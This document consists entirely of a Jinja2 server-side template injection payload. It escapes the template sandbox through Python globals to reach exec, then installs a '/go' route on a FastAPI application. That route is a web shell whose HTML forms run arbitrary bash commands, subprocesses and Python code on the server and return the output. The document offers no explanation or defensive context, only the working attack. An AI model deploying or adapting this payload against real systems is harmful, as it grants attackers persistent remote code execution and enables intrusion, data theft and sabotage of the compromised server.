```
{%set exec = self.__init__.__globals__.__builtins__.exec%}
{{ exec('from fastapi import Query

from fastapi import FastAPI, Request

async def handler(request: Request):
    from fastapi.responses import HTMLResponse
    from typing import List

    html_text = """<!DOCTYPE html>
<body>
    <form id="f1">
        <input type="hidden" name="form_type" value="shell" />
        <textarea name="command" rows="5" cols="50" placeholder="command"></textarea><br>
        <button type="submit">run</button>
    </form>
    <div id="r1"></div>
    <hr>
    <form id="f2">
        <input type="hidden" name="form_type" value="subprocess" />
        <input type="text" name="arg" placeholder="asdf" /><br>
        <input type="text" name="arg" /><br>
        <input type="text" name="arg" /><br>
        <input type="text" name="arg" /><br>
        <input type="text" name="arg" /><br>
        <input type="text" name="arg" /><br>
        <input type="text" name="arg" /><br>
        <input type="text" name="arg" /><br>
        <input type="text" name="arg" /><br>
        <input type="text" name="arg" /><br>
        <button type="submit">run</button>
    </form>
    <div id="r2"></div>
    <hr>
    <form id="f3">
        <input type="hidden" name="form_type" value="python" />
        <textarea name="python" rows="10" cols="50" placeholder="python"></textarea><br>
        <button type="submit">run</button>
    </form>
    <div id="r3"></div>
    <script>
        [1,2,3].forEach(n => {
            document.getElementById("f"+n).onsubmit = async e => {
                e.preventDefault();
                const res = await fetch("/go", {method:"POST", body: new FormData(e.target)});
                document.getElementById("r"+n).textContent = await res.text();
            };
        });
    </script>
</body>
</html>"""

    def recovery(t):
        t = t.replace(chr(38) + "l" + "t" + ";", chr(60))
        t = t.replace(chr(38) + "g" + "t" + ";", chr(62))
        return t
    
    # print("ASfasdfsdafasd")
    # import base64
    # html_text = base64.b64decode(encoded_html.encode()).decode()
    html_text = recovery(html_text)
    if request.method == "GET":
        return HTMLResponse(html_text)
 
    form = await request.form()
    form_type = form.get("form_type")

    import subprocess
 
    if form_type == "shell":
        command = form.get("command")
        print(f"[INFO]: {command}")
        r = subprocess.run(
            ["bash", "-c", command],
            capture_output=True,
            text=True,
            timeout=60,
        )
        print(r.stdout)
        return {
            "cmd": command,
            "code": r.returncode,
            "stdout": r.stdout,
            "stderr": r.stderr,
        }
 
    elif form_type == "subprocess":
        args = form.getlist("arg")
        cmd = args[0]
        arg = []
        for i in range(1, len(args)):
            if args[i] != "":
                arg.append(args[i])
            else:
                break
        r = subprocess.run(
            [cmd, *arg],
            shell=False,
            capture_output=True,
            text=True,
            timeout=60,
        )
        return {
            "argv": [cmd, *arg],
            "code": r.returncode,
            "stdout": r.stdout,
            "stderr": r.stderr,
        }
 
    elif form_type == "python":
        python = form.get("python")
        print("python code:", python)
        ns = {}
        exec(python, ns)
        print("python result:", ns["result"] if "result" in ns else "empty")
        return {"result": ns["result"] if "result" in ns else "empty" }

    return HTMLResponse(recovery("<script>history.back()</script>"))

__import__("sys").modules["app.main"].app.add_api_route("/go", handler, methods=["GET", "POST"])') }}
```
